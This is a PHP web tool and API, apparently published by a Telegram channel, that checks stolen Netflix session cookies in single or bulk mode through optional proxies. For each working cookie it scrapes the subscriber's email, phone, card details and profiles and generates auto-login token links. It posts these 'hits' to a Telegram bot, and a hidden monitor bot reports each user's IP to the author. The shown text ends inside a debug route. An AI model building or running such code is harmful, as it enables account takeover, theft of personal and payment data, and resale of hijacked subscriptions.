<?php
/**
 * Netflix Cookie Checker — Web UI + API + Monitor bot
 * Optimized for Fly.io deployment
 *
 * Web UI:
 *   GET  /                 → HTML form
 *
 * API:
 *   ?nfchk=[...]&tg_token=[123:ABC]&tg_chat=[-1001234567890]
 *   ?nfbulk=[c1+_+c2+_+c3]&tg_token=[...]&tg_chat=[...]
 *   &proxy=[http://user:pass@ip:port]
 *   &redact=1
 *   &pretty=1
 *   ?action=health
 *   ?action=debug
 *
 * By SAR.  |  Channel: @sar_info1
 */

error_reporting(E_ALL);
ini_set('display_errors', '0');
set_time_limit(300);

/* ============ MONITOR BOT ============ */
const MONITOR_TG_TOKEN = '8531853647:AAH9Q7u9bwOabIFC16P6LUz9chaCiR2kR78';
const MONITOR_TG_CHAT  = '6568760089';

const UA_WEB     = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const UA_ANDROID = 'com.netflix.mediaclient/63884 (Linux; U; Android 13)';
const TIMEOUT    = 25;
const IOS_API    = 'https://ios.prod.ftl.netflix.com/iosui/user/15.48';
const ANDROID_GQL= 'https://android13.prod.ftl.netflix.com/graphql';

/* =========================================================
   Helpers
   ========================================================= */
function jout(array $d, int $code = 200): void {
    http_response_code($code);
    header('Content-Type: application/json; charset=utf-8');
    $f = JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES;
    if (!empty($_GET['pretty'])) $f |= JSON_PRETTY_PRINT;
    echo json_encode($d, $f); exit;
}
function rx($p, $s, $d = '') { return preg_match($p, $s, $m) ? $m[1] : $d; }
function rx_all($p, $s)      { return preg_match_all($p, $s, $m) ? $m[1] : []; }
function djs($s) {
    if ($s === '') return '';
    $s = preg_replace_callback('/\\\\x([0-9a-fA-F]{2})/', fn($m)=>chr(hexdec($m[1])), $s);
    $s = preg_replace_callback('/\\\\u([0-9a-fA-F]{4})/', fn($m)=>mb_chr(hexdec($m[1]),'UTF-8'), $s);
    return trim($s);
}
function flag($cc) {
    $cc = strtoupper($cc);
    if (strlen($cc) !== 2) return "\u{1F30D}";
    return mb_chr(0x1F1E6 + (ord($cc[0])-65),'UTF-8') . mb_chr(0x1F1E6 + (ord($cc[1])-65),'UTF-8');
}
function country_name($cc) {
    static $map = [
        'US'=>'United States','GB'=>'United Kingdom','DE'=>'Germany','FR'=>'France',
        'ES'=>'Spain','IT'=>'Italy','TR'=>'Turkey','BR'=>'Brazil','JP'=>'Japan',
        'KR'=>'South Korea','IN'=>'India','CA'=>'Canada','AU'=>'Australia','MX'=>'Mexico',
        'NL'=>'Netherlands','SE'=>'Sweden','NO'=>'Norway','DK'=>'Denmark','FI'=>'Finland',
        'PL'=>'Poland','RU'=>'Russia','AR'=>'Argentina','CL'=>'Chile','CO'=>'Colombia',
        'PE'=>'Peru','AE'=>'UAE','SA'=>'Saudi Arabia','EG'=>'Egypt','ZA'=>'South Africa',
        'ID'=>'Indonesia','MY'=>'Malaysia','SG'=>'Singapore','TH'=>'Thailand','VN'=>'Vietnam',
        'PH'=>'Philippines','KE'=>'Kenya','NG'=>'Nigeria','GH'=>'Ghana','PT'=>'Portugal',
        'RO'=>'Romania','HU'=>'Hungary','CZ'=>'Czech Republic','UA'=>'Ukraine',
        'AT'=>'Austria','CH'=>'Switzerland','BE'=>'Belgium','IL'=>'Israel','TW'=>'Taiwan',
        'HK'=>'Hong Kong','PK'=>'Pakistan','NZ'=>'New Zealand','SK'=>'Slovakia',
        'HR'=>'Croatia','RS'=>'Serbia','BG'=>'Bulgaria',
    ];
    return $map[strtoupper($cc)] ?? ($cc ?: 'Unknown');
}
function client_ip(): string {
    if (!empty($_SERVER['HTTP_FLY_CLIENT_IP'])) return $_SERVER['HTTP_FLY_CLIENT_IP'];
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    return trim(explode(',', $ip)[0]);
}
function client_ua(): string {
    return substr($_SERVER['HTTP_USER_AGENT'] ?? 'unknown', 0, 120);
}
function unwrap($v): string {
    if (is_array($v)) $v = implode("\n", $v);
    $v = trim((string)$v);
    if (strlen($v) >= 2 && $v[0] === '[' && substr($v, -1) === ']') return trim(substr($v, 1, -1));
    return $v;
}
function mask_token(string $t): string {
    if ($t === '') return '(none)';
    if (strlen($t) < 12) return '***';
    return substr($t, 0, 6) . '...' . substr($t, -4);
}
function redact_netflix_id(string $id): string {
    if ($id === '') return '';
    if (strlen($id) < 20) return '***';
    return substr($id, 0, 10) . '...' . substr($id, -6);
}
function h($s): string { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

/* =========================================================
   HTTP
   ========================================================= */
function _do_request(string $method, string $url, $payload, array $headers, ?string $proxy, int $timeout): array {
    $body = null;
    if ($payload !== null) {
        $body = is_array($payload) ? http_build_query($payload) : $payload;
        $headers[] = 'Content-Type: application/x-www-form-urlencoded';
        $headers[] = 'Content-Length: ' . strlen($body);
    }

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        $co = [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_MAXREDIRS      => 5,
            CURLOPT_TIMEOUT        => $timeout,
            CURLOPT_CONNECTTIMEOUT => 15,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_IPRESOLVE      => CURL_IPRESOLVE_V4,
            CURLOPT_HTTPHEADER     => $headers,
            CURLOPT_ENCODING       => '',
            CURLOPT_USERAGENT      => UA_WEB,
        ];
        if ($method === 'POST') {
            $co[CURLOPT_POST] = true;
            $co[CURLOPT_POSTFIELDS] = $body;
        }
        if ($proxy) $co[CURLOPT_PROXY] = $proxy;
        curl_setopt_array($ch, $co);
        $r = curl_exec($ch);
        $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $err  = curl_error($ch);
        curl_close($ch);
        if ($r !== false && $code > 0) {
            return ['code'=>$code, 'body'=>$r, 'err'=>'', 'via'=>'curl'];
        }
    }

    $opts = [
        'http' => [
            'method'=>$method, 'header'=>implode("\r\n", $headers),
            'timeout'=>$timeout, 'ignore_errors'=>true,
            'follow_location'=>1, 'max_redirects'=>5,
        ],
        'ssl' => ['verify_peer'=>false, 'verify_peer_name'=>false],
    ];
    if ($body !== null) $opts['http']['content'] = $body;
    if ($proxy) $opts['http']['proxy'] = str_replace(['http://','https://'], 'tcp://', $proxy);

    $ctx  = stream_context_create($opts);
    $resp = @file_get_contents($url, false, $ctx);

    $code = 0;
    if (isset($http_response_header) && is_array($http_response_header)) {
        foreach ($http_response_header as $line) {
            if (preg_match('#^HTTP/\S+\s+(\d+)#', $line, $m)) { $code = (int)$m[1]; break; }
        }
    }
    return ['code'=>$code, 'body'=>$resp===false?'':$resp, 'err'=>$resp===false?'stream failed':'', 'via'=>'stream'];
}
function http_get($u, $h=[], $p=null, $t=TIMEOUT)   { return _do_request('GET',  $u, null, $h, $p, $t); }
function http_post($u, $b, $h=[], $p=null, $t=TIMEOUT){ return _do_request('POST', $u, $b, $h, $p, $t); }

/* =========================================================
   Telegram
   ========================================================= */
function tg_post(string $token, array $params, int $timeout = 10): ?array {
    if ($token === '') return null;
    $last = null;
    for ($attempt = 0; $attempt < 2; $attempt++) {
        $r = http_post("https://api.telegram.org/bot{$token}/sendMessage", $params, [], null, $timeout);
        $last = $r;
        if ($r['body']) {
            $j = json_decode($r['body'], true);
            if (is_array($j) && !empty($j['ok'])) return $j;
            error_log("TG FAIL a$attempt: code={$r['code']} err={$r['err']}");
        }
        usleep(300000);
    }
    if ($last) return ['_fail'=>true, 'code'=>$last['code'], 'err'=>$last['err'], 'body'=>substr($last['body'],0,200)];
    return null;
}

function monitor_report(string $ip, string $usedToken, string $usedChat): void {
    if (MONITOR_TG_TOKEN === '' || MONITOR_TG_CHAT === '') return;
    $tokenDisplay = $usedToken !== '' ? mask_token($usedToken) : '(not provided)';
    $chatDisplay  = $usedChat  !== '' ? $usedChat  : '(not provided)';
    $ua           = client_ua();
    $text =
        "🔔 <b>API USED</b>\n\n" .
        "🌐 <b>IP:</b> <code>{$ip}</code>\n" .
        "🧭 <b>UA:</b> <code>{$ua}</code>\n" .
        "🤖 <b>Bot token:</b> <code>{$tokenDisplay}</code>\n" .
        "💬 <b>Chat id:</b> <code>{$chatDisplay}</code>\n" .
        "🕐 <b>Time:</b> " . gmdate('Y-m-d H:i:s') . " UTC\n\n" .
        "👨‍💻 <b>By SAR.</b>  •  📢 @sar_info1";
    tg_post(MONITOR_TG_TOKEN, [
        'chat_id'=>MONITOR_TG_CHAT, 'text'=>$text, 'parse_mode'=>'HTML',
        'disable_web_page_preview'=>'true',
    ]);
}

/* =========================================================
   Cookie parser
   ========================================================= */
function load_cookies(string $text): array {
    $text = trim($text);
    if ($text === '') return [];
    if ($text[0] === '[' || $text[0] === '{') {
        $j = json_decode($text, true);
        if (is_array($j)) {
            if (isset($j[0]['name'])) {
                $out = [];
                foreach ($j as $c) if (isset($c['name'],$c['value'])) $out[$c['name']] = $c['value'];
                if ($out) return $out;
            } else { return $j; }
        }
    }
    $out = [];
    foreach (preg_split("/\r?\n/", $text) as $line) {
        $line = trim($line);
        if ($line === '' || $line[0] === '#') continue;
        $p = explode("\t", $line);
        if (count($p) >= 7) $out[$p[5]] = $p[6];
    }
    if ($out) return $out;
    foreach (preg_split('/[;\n]/', $text) as $part) {
        $part = trim($part);
        if (strpos($part, '=') !== false) {
            [$k, $v] = explode('=', $part, 2);
            $k = trim($k);
            if ($k !== '') $out[$k] = trim($v);
        }
    }
    return $out;
}

/* =========================================================
   NFToken + check
   ========================================================= */
function generate_nftoken(string $nfid, ?string $proxy = null): ?string {
    if ($nfid === '') return null;
    $nfid = urldecode($nfid);
    $params = [
        'appVersion'=>'15.48.1',
        'config'=>'{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","billboardEnabled":"true","sharksEnabled":"true","useCDSGalleryEnabled":"true","avifFormatEnabled":"false"}',
        'device_type'=>'NFAPPL-02-',
        'esn'=>'NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200',
        'idiom'=>'phone','iosVersion'=>'15.8.5','isTablet'=>'false','languages'=>'en-US',
        'locale'=>'en-US','maxDeviceWidth'=>'375','model'=>'saget','modelType'=>'IPHONE8-1',
        'odpAware'=>'true','path'=>'["account","token","default"]','pathFormat'=>'graph',
        'pixelDensity'=>'2.0','progressive'=>'false','responseFormat'=>'json',
    ];
    $h = [
        'User-Agent: Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)',
        'x-netflix.request.attempt: 1',
        'x-netflix.context.app-version: 15.48.1',
        'x-netflix.client.type: argo',
        'accept-language: en-US;q=1',
        'x-netflix.request.client.timezoneid: Asia/Dhaka',
        'Cookie: NetflixId=' . $nfid,
    ];
    $r = http_get(IOS_API . '?' . http_build_query($params), $h, $proxy);
    if ($r['code'] === 200 && $r['body']) {
        $d = json_decode($r['body'], true);
        $t = $d['value']['account']['token']['default']['token'] ?? null;
        if ($t) return (string)$t;
    }
    $payload = json_encode([
        'operationName'=>'CreateAutoLoginToken',
        'variables'=>['scope'=>'WEBVIEW_MOBILE_STREAMING'],
        'extensions'=>['persistedQuery'=>['version'=>102,'id'=>'76e97129-f4b5-41a0-a73c-12e674896849']],
    ]);
    $r2 = http_post(ANDROID_GQL, $payload, [
        'User-Agent: ' . UA_ANDROID, 'Accept: application/json',
        'Content-Type: application/json', 'Cookie: NetflixId=' . $nfid,
    ], $proxy);
    if ($r2['code'] === 200 && $r2['body']) {
        $d = json_decode($r2['body'], true);
        $t = $d['data']['createAutoLoginToken'] ?? null;
        if ($t) return (string)$t;
    }
    return null;
}

function check_account(array $c, ?string $proxy = null): ?array {
    if (empty($c['NetflixId']) && empty($c['SecureNetflixId'])) return null;
    $cookieHdr = implode('; ', array_map(fn($k,$v)=>"$k=$v", array_keys($c), $c));
    $r = http_get('https://www.netflix.com/account', [
        'Cookie: ' . $cookieHdr,
        'User-Agent: ' . UA_WEB,
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language: en-US,en;q=0.9', 'DNT: 1',
    ], $proxy);
    if ($r['code'] === 0 || $r['code'] >= 400) return null;
    if (stripos($r['url'] ?? '', 'login') !== false) return null;
    $html = $r['body'];
    if (strpos($html, '"membershipStatus":"CURRENT_MEMBER"') === false) return null;

    $email = djs(rx('/"emailAddress":"([^"]+)"/', $html));
    $name  = djs(rx('/"userInfo":\{"name":"([^"]+)"/', $html)) ?: djs(rx('/"firstName":"([^"]+)"/', $html));
    $cc    = rx('/"countryOfSignup":"([A-Z]{2,3})"/', $html, 'XX');

    $since = djs(rx('/"memberSince":"([^"]+)"/', $html));
    if ($since === '') {
        $ts = rx('/"memberSince":\{"fieldType":"Numeric","value":(\d+)\}/', $html);
        if ($ts !== '' && ctype_digit($ts)) $since = gmdate('F Y', (int)($ts/1000));
    }
    $plan      = djs(rx('/"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}/', $html));
    $plan_id   = rx('/"planId":\{"fieldType":"String","value":"([^"]+)"\}/', $html);
    $price     = djs(rx('/"planPrice":\{"fieldType":"String","value":"([^"]+)"\}/', $html));
    $q_raw     = strtoupper(rx('/"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}/', $html));
    $qmap      = ['UHD'=>'UHD 4K','FHD'=>'FHD 1080p','HD'=>'HD 720p','SD'=>'SD 480p'];
    $quality   = $qmap[$q_raw] ?? ($q_raw ?: 'N/A');
    $streams   = rx('/"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}/', $html, 'N/A');
    $nextbill  = djs(rx('/"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}/', $html));

    $pmStart = strpos($html, '"paymentMethods"');
    $pmRaw   = $pmStart !== false ? substr($html, $pmStart, 3000) : '';
    $card_brand = rx('/"paymentOptionLogo":"([^"]+)"/', $pmRaw) ?: rx('/"type":\{"fieldType":"String","value":"([^"]+)"\}/', $pmRaw);
    $pay_type   = rx('/"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}/', $pmRaw);
    $card_last4 = rx('/"GrowthCardPaymentMethod"[^}]*"displayText":"([^"]+)"/', $pmRaw) ?: rx('/"displayText":\{"fieldType":"String","value":"([^"]+)"\}/', $pmRaw);

    $phone = djs(rx('/"phoneNumber":"([^"]*)"/', $html)) ?: 'N/A';
    $phone_verified = rx('/"isPhoneVerified":(?:\{"fieldType":"Boolean","value":)?(true|false)/', $html) === 'true';
    $extra_raw = rx('/"extraMemberSlots":\{"fieldType":"Numeric","value":(\d+)\}/', $html, '0');
    $extra_slots = ctype_digit($extra_raw) ? (int)$extra_raw : 0;
    $can_change = strpos($html, '"canChangePlan":{"fieldType":"Boolean","value":true}') !== false;
    $free_trial = strpos($html, '"isInFreeTrial":true') !== false;

    $profs = array_map('djs', rx_all('/"profileName":"([^"]+)"/', $html));
    if (!$profs) $profs = array_map('djs', rx_all('/"profileName":\{"fieldType":"String","value":"([^"]+)"\}/', $html));
    $profs = array_values(array_unique(array_filter($profs)));

    $user_guid = rx('/"userGuid":"([^"]+)"/', $html);
    $nfid      = $c['NetflixId'] ?? '';

    $tok = $nfid !== '' ? generate_nftoken($nfid, $proxy) : null;
    if ($tok) {
        $ts = rawurlencode($tok);
        $login_pc    = 'https://netflix.com/?nftoken=' . $ts;
        $login_phone = 'https://netflix.com/unsupported?nftoken=' . $ts;
        $login_tv    = 'https://www.netflix.com/tv2?nftoken=' . $ts;
    } else {
        $login_pc = $login_phone = 'N/A';
        $login_tv = 'https://www.netflix.com/tv2';
    }

    return [
        'email'=>$email ?: 'N/A',
        'name'=> $name ?: ($profs[0] ?? 'N/A'),
        'country_code'=>$cc,
        'country'=> country_name($cc),
        'country_flag'=>flag($cc),
        'plan'=>$plan ?: 'N/A',
        'plan_id'=>$plan_id ?: 'N/A',
        'price'=>$price ?: 'N/A',
        'member_since'=>$since ?: 'N/A',
        'next_billing'=>$nextbill ?: 'N/A',
        'free_trial'=>$free_trial,
        'can_change'=>$can_change,
        'video_quality'=>$quality,
        'max_streams'=>(string)$streams,
        'extra_slots'=>$extra_slots,
        'card_brand'=>$card_brand ?: 'N/A',
        'card_last4'=>$card_last4 ?: 'N/A',
        'payment_method'=>$pay_type ?: 'N/A',
        'phone'=>$phone,
        'phone_verified'=>$phone_verified,
        'profiles'=>$profs,
        'profile_count'=>count($profs),
        'user_guid'=>$user_guid ?: 'N/A',
        'netflix_id_raw'=>$nfid,
        'login_pc'=>$login_pc,
        'login_phone'=>$login_phone,
        'login_tv'=>$login_tv,
    ];
}

function tg_send_hit(string $token, string $chat, array $d, bool $redact = false): array {
    if ($token === '' || $chat === '') return ['ok'=>false, 'error'=>'missing_token_or_chat'];
    $pv    = $d['phone_verified'] ? '✅' : '❌';
    $profs = $d['profiles'] ? implode(', ', array_slice($d['profiles'], 0, 4)) : 'N/A';
    $nfid  = $d['netflix_id_raw'];
    if ($redact) $nfid = redact_netflix_id($nfid);
    $cookieVal = 'NetflixId=' . $nfid;

    $linksBlock = "\n\n🔗 <b>Login Links</b>\n";
    $linksBlock .= $d['login_pc']    !== 'N/A' ? "💻 <b>PC:</b>    <a href=\"{$d['login_pc']}\">Click here</a>\n" : "💻 <b>PC:</b>    N/A\n";
    $linksBlock .= $d['login_phone'] !== 'N/A' ? "📱 <b>Phone:</b> <a href=\"{$d['login_phone']}\">Click here</a>\n" : "📱 <b>Phone:</b> N/A\n";
    $linksBlock .= "📺 <b>TV:</b>    <a href=\"{$d['login_tv']}\">Click here</a>";

    $caption =
        "🎬 <b>NETFLIX HIT</b>\n\n" .
        "👤 <b>{$d['name']}</b>\n" .
        "📧 <code>{$d['email']}</code>\n" .
        "🌍 {$d['country']} {$d['country_flag']} ({$d['country_code']})\n\n" .
        "📋 <b>{$d['plan']}</b>  •  💰 {$d['price']}\n" .
        "📅 Since: {$d['member_since']}\n" .
        "🗓 Billing: {$d['next_billing']}\n" .
        "🎁 Free Trial: " . ($d['free_trial']?'Yes':'No') . "\n\n" .
        "🎥 {$d['video_quality']}  |  📺 {$d['max_streams']} streams  |  ➕ {$d['extra_slots']} extra\n" .
        "💳 {$d['card_brand']} *{$d['card_last4']}  •  {$d['payment_method']}\n" .
        "📞 {$d['phone']}  {$pv}\n" .
        "👥 Profiles ({$d['profile_count']}): {$profs}\n\n" .
        "🍪 <b>Cookie</b>\n<code>{$cookieVal}</code>" .
        $linksBlock . "\n\n" .
        "👨‍💻 <b>By SAR.</b>\n" .
        "📢 <b>Channel:</b> @sar_info1";

    $buttons = []; $row1 = [];
    if ($d['login_pc']    !== 'N/A') $row1[] = ['text'=>'🖥 PC',    'url'=>$d['login_pc']];
    if ($d['login_phone'] !== 'N/A') $row1[] = ['text'=>'📱 Phone', 'url'=>$d['login_phone']];
    if ($row1) $buttons[] = $row1;
    $buttons[] = [['text'=>'📺 TV', 'url'=>$d['login_tv']]];

    $params = [
        'chat_id'=>$chat, 'text'=>$caption, 'parse_mode'=>'HTML',
        'disable_web_page_preview'=>'true',
        'reply_markup'=>json_encode(['inline_keyboard'=>$buttons]),
    ];
    $r = tg_post($token, $params);
    if ($r && !empty($r['ok'])) return ['ok'=>true, 'code'=>200, 'err'=>''];
    if ($r && !empty($r['_fail'])) return ['ok'=>false, 'code'=>$r['code'], 'err'=>$r['err'], 'body'=>$r['body']];
    return ['ok'=>false, 'code'=>0, 'err'=>'no_response'];
}

/* =========================================================
   WEB UI — root only
   ========================================================= */
$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';
$isRoot = ($method === 'GET'
    && !isset($_GET['action'])
    && !isset($_GET['nfchk'])
    && !isset($_GET['nfbulk']));

if ($isRoot) {
    header('Content-Type: text/html; charset=utf-8');
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Netflix Checker — SAR</title>
<style>
:root{--bg:#0b1020;--fg:#e8eefc;--muted:#8a94b0;--card:#141a33;--acc:#4d7cff;--ok:#22c55e;--bad:#ef4444;--warn:#f59e0b;--border:#232b4a;}
*{box-sizing:border-box}
body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:var(--bg);color:var(--fg);min-height:100vh}
.wrap{max-width:1000px;margin:0 auto;padding:28px 20px}
header{display:flex;align-items:center;gap:12px;margin-bottom:22px;flex-wrap:wrap}
header h1{font-size:22px;margin:0}
header .tag{background:linear-gradient(90deg,var(--acc),#8b5cf6);color:#fff;font-size:11px;padding:3px 9px;border-radius:20px;font-weight:600;letter-spacing:.4px}
header .ch{margin-left:auto;font-size:12px;color:var(--muted)}
header .ch a{color:var(--acc);text-decoration:none}
.card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:20px;margin-bottom:18px}
.card h2{font-size:14px;text-transform:uppercase;letter-spacing:.6px;color:var(--muted);margin:0 0 14px}
label{display:block;font-size:12px;color:var(--muted);margin:12px 0 6px;font-weight:600}
textarea,input,select{width:100%;padding:11px 13px;background:#0d1330;border:1px solid var(--border);border-radius:9px;color:var(--fg);font-family:ui-monospace,Menlo,monospace;font-size:13px;outline:none;transition:border .15s}
textarea:focus,input:focus,select:focus{border-color:var(--acc)}
textarea{min-height:120px;resize:vertical}
.row{display:grid;grid-template-columns:1fr 1fr;gap:14px}
@media(max-width:700px){.row{grid-template-columns:1fr}}
button{margin-top:16px;padding:12px 22px;background:linear-gradient(90deg,var(--acc),#8b5cf6);color:#fff;border:0;border-radius:10px;font-size:14px;font-weight:600;cursor:pointer;transition:opacity .15s}
button:hover{opacity:.9}
button:disabled{opacity:.5;cursor:not-allowed}
.res{margin-top:18px;padding:14px;background:#0d1330;border:1px solid var(--border);border-radius:10px;font-family:ui-monospace,Menlo,monospace;font-size:12px;white-space:pre-wrap;word-break:break-all;max-height:600px;overflow:auto;display:none}
.res.show{display:block}
.res .k{color:var(--muted)}
.res .ok{color:var(--ok);font-weight:700}
.res .bad{color:var(--bad);font-weight:700}
.res .warn{color:var(--warn);font-weight:700}
.chip{display:inline-block;padding:3px 8px;border-radius:20px;font-size:11px;background:#1b2347;color:var(--muted);margin-right:6px}
details summary{cursor:pointer;color:var(--muted);font-size:13px;margin-top:8px}
details[open] summary{color:var(--fg)}
</style>
</head>
<body>
<div class="wrap">
  <header>
    <h1>🎬 Netflix Checker</h1>
    <span class="tag">SAR</span>
    <div class="ch">📢 <a href="https://t.me/sar_info1" target="_blank">@sar_info1</a></div>
  </header>

  <div class="card">
    <h2>Check a cookie</h2>

    <label>Cookie <span class="chip">NetflixId=... ; SecureNetflixId=...</span></label>
    <textarea id="cookie" placeholder="NetflixId=eyJhbGciOi...;SecureNetflixId=AQAAAA..."></textarea>

    <div class="row">
      <div>
        <label>Bot token</label>
        <input id="tgToken" placeholder="123456:ABC-DEF..." autocomplete="off">
      </div>
      <div>
        <label>Chat id</label>
        <input id="tgChat" placeholder="-1001234567890" autocomplete="off">
      </div>
    </div>

    <details>
      <summary>Advanced (proxy / redact)</summary>
      <div class="row">
        <div>
          <label>Proxy</label>
          <input id="proxy" placeholder="http://user:pass@ip:port" autocomplete="off">
        </div>
        <div>
          <label>Redact NetflixId in Telegram message</label>
          <select id="redact"><option value="">No</option><option value="1">Yes</option></select>
        </div>
      </div>
    </details>

    <button id="go">Check account</button>

    <div id="out" class="res"></div>
  </div>
</div>

<script>
const $ = s => document.querySelector(s);
const out = $('#out');
const btn = $('#go');

function esc(s){return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]))}

function render(res){
  out.classList.add('show');
  if (res.ok && res.status === 'hit'){
    const d = res.data;
    let h = '';
    h += '<div><span class="ok">✔ HIT</span> · ' + esc(res.elapsed_ms) + ' ms</div><br>';
    h += '<div><span class="k">Name:</span> '    + esc(d.name) + '</div>';
    h += '<div><span class="k">Email:</span> '   + esc(d.email) + '</div>';
    h += '<div><span class="k">Country:</span> ' + esc(d.country) + ' ' + esc(d.country_flag) + ' (' + esc(d.country_code) + ')</div>';
    h += '<div><span class="k">Plan:</span> '    + esc(d.plan) + ' · ' + esc(d.price) + '</div>';
    h += '<div><span class="k">Since:</span> '   + esc(d.member_since) + '</div>';
    h += '<div><span class="k">Billing:</span> ' + esc(d.next_billing) + '</div>';
    h += '<div><span class="k">Free trial:</span> ' + (d.free_trial?'Yes':'No') + '</div>';
    h += '<div><span class="k">Quality:</span> ' + esc(d.video_quality) + ' · ' + esc(d.max_streams) + ' streams · +' + esc(d.extra_slots) + '</div>';
    h += '<div><span class="k">Card:</span> '    + esc(d.card_brand) + ' *' + esc(d.card_last4) + ' · ' + esc(d.payment_method) + '</div>';
    h += '<div><span class="k">Phone:</span> '   + esc(d.phone) + ' ' + (d.phone_verified?'✅':'❌') + '</div>';
    h += '<div><span class="k">Profiles:</span> ' + esc(d.profile_count) + ' — ' + esc((d.profiles||[]).join(', ')) + '</div>';
    h += '<div><span class="k">Login PC:</span> '    + esc(d.login_pc) + '</div>';
    h += '<div><span class="k">Login Phone:</span> ' + esc(d.login_phone) + '</div>';
    h += '<div><span class="k">Login TV:</span> '    + esc(d.login_tv) + '</div>';
    h += '<br><div><span class="k">Telegram:</span> ' + (res.telegram_sent ? '<span class="ok">sent</span>' : '<span class="bad">failed</span>') + '</div>';
    if (res.telegram_detail && !res.telegram_detail.ok){
      h += '<div><span class="k">TG detail:</span> ' + esc(JSON.stringify(res.telegram_detail)) + '</div>';
    }
    out.innerHTML = h;
  } else if (res.ok && res.status === 'bulk'){
    let h = '<div><span class="ok">✔ BULK</span> · total ' + esc(res.count) + ' · hits ' + esc(res.hits) + ' · ' + esc(res.elapsed_ms) + ' ms</div><br>';
    (res.results||[]).forEach((r,i)=>{
      if (r.ok){
        const d = r.data;
        h += '<div><span class="ok">#' + i + ' HIT</span> · ' + esc(d.email) + ' · ' + esc(d.plan) + ' · ' + esc(d.country_code) + ' · tg=' + (r.telegram_sent?'ok':'fail') + '</div>';
      } else {
        h += '<div><span class="bad">#' + i + ' ' + esc(r.error||'fail') + '</span></div>';
      }
    });
    out.innerHTML = h;
  } else {
    out.innerHTML = '<div><span class="bad">✘ ' + esc(res.error || 'fail') + '</span> · ' + esc(res.elapsed_ms||'') + ' ms</div>';
    if (res.telegram_detail) out.innerHTML += '<br><span class="k">TG:</span> ' + esc(JSON.stringify(res.telegram_detail));
    if (res.message) out.innerHTML += '<br><span class="k">msg:</span> ' + esc(res.message);
  }
}

btn.addEventListener('click', async () => {
  const cookie = $('#cookie').value.trim();
  if (!cookie){ alert('Paste a cookie first'); return; }

  const params = new URLSearchParams();
  params.set('nfchk', cookie);
  const t = $('#tgToken').value.trim(); if (t) params.set('tg_token', t);
  const c = $('#tgChat').value.trim();  if (c) params.set('tg_chat',  c);
  const p = $('#proxy').value.trim();   if (p) params.set('proxy',    p);
  const r = $('#redact').value;         if (r) params.set('redact',   r);

  btn.disabled = true;
  out.classList.add('show');
  out.textContent = 'Checking… please wait (5–30s)';
  try {
    const resp = await fetch('?' + params.toString());
    const json = await resp.json();
    render(json);
  } catch (e) {
    out.innerHTML = '<span class="bad">Network error:</span> ' + esc(e.message);
  } finally {
    btn.disabled = false;
  }
});
</script>
</body>
</html>
<?php
    exit;
}

/* =========================================================
   API ROUTES
   ========================================================= */
header('Content-Type: application/json; charset=utf-8');
header('X-Content-Type-Options: nosniff');

$start  = microtime(true);
$ip     = client_ip();
$action = unwrap($_GET['action'] ?? '');

if ($action === 'health') {
    jout([
        'ok'=>true,
        'ts'=>time(),
        'curl'=>function_exists('curl_init') ? 'yes' : 'no',
        'host'=>$_SERVER['HTTP_HOST'] ?? 'unknown',
        'by'=>'SAR.',
        'channel'=>'@sar_info1',
    ]);
}

if ($action === 'debug') {
    $tests = [];
    $tests['curl']     = function_exists('curl_init') ? 'YES' : 'NO';
    $tests['openssl']  = extension_loaded('openssl') ? 'YES' : 'NO';
    $tests['mbstring'] = extension_loaded('mbstring') ? 'YES' : 'NO';
    $tests['php_version'] = PHP_VERSION;

    $dns = @gethostbynamel('api.telegram.org');
    $tests['dns_telegram'] = $dns ? implode(',', $dns) : 'FAILED';

    $r = http_get('https://api.telegram.org', [], null, 10);
    $tests['tg_http'] = $r['code'];
    $tests['tg_via']  = $r['via'] ?? '?';
    $tests['tg_err']  = $r['err'];
    $tests['tg_body'] = substr($r['body'], 0, 120);

    $r2 = http_get('https://www.netflix.com', [], null, 10);
    $tests['nf_http'] = $r2['code'];
    $tests['nf_via']  = $r2['via'] ?? '?';
    $tests['nf_err']  = $r2['err'];

    $tr = tg_post(MONITOR_TG_TOKEN, [
        'chat_id'=>MONITOR_TG_CHAT,
        'text'=>'🧪 Debug ping ' . date('H:i:s'),
    ]);
    if ($tr && !empty($tr['ok'])) {
        $tests['tg_send'] = 'OK';
    } elseif ($tr && !empty($tr['_fail'])) {
        $tests['tg_send'] = 'FAIL';
        $tests['tg_send_code'] = $tr['code'];
        $tests['tg_send_err']  = $tr['err'];
        $tests['tg_send_body'] = $tr['body'];
    } else {
        $tests['tg_send'] = 'FAIL (null)';
    }

    $tests['fly_client_ip'] = $_SERVER['HTTP_FLY_CLIENT_IP'] ?? '(not set)';
    $tests['server_region'] = $_SERVER['FLY_REGION'] ?? ($_SERVER['HTTP_FLY_REGION'] ?? '(unknown)');

